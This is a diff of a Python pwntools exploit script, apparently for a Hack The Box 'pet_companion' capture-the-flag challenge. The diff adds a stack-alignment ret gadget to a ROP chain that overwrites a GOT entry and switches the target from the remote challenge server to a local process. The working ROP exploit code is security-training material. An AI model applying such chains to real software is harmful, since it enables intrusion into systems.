@@ -2,6 +2,8 @@
 cyclic 1024
 cyclic -l raaa
 68+4 == 72
+
+0x00000000004004de : ret
 '''
 
 #!/usr/bin/python3
@@ -19,9 +21,10 @@ libc = ELF('./glibc/libc.so.6')
 padding = offset*b'A'
 
 #ip, port='161.35.168.118', 30070
-ip, port = '94.237.59.34', 59604   #HTB
-io = remote(ip,port)
+#ip, port = '94.237.59.34', 59604   #HTB
+#io = remote(ip,port)
 #io = process('./pet_companion')
+io = process('./pet_companion')
 
 #0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
 #0x004005e8: add [rbp-0x3d], ebx; nop [rax+rax]; rep ret;
@@ -73,7 +76,7 @@ print(hex(offset))
 read_got = elf.got['read']  #libc_base + libc.sym['read']
 read_plt = elf.sym['read']
 
-rop_chain = p64(0x0040073a) + p64(offset) + p64(read_got+0x3d) + p64(0)*4
+rop_chain = p64(0x00000000004004de) + p64(0x0040073a) + p64(offset) + p64(read_got+0x3d) + p64(0)*4
 rop_chain += p64(0x004005e8)
 rop_chain += p64(read_plt)
 #rop_chain += p64(read_got)  #error
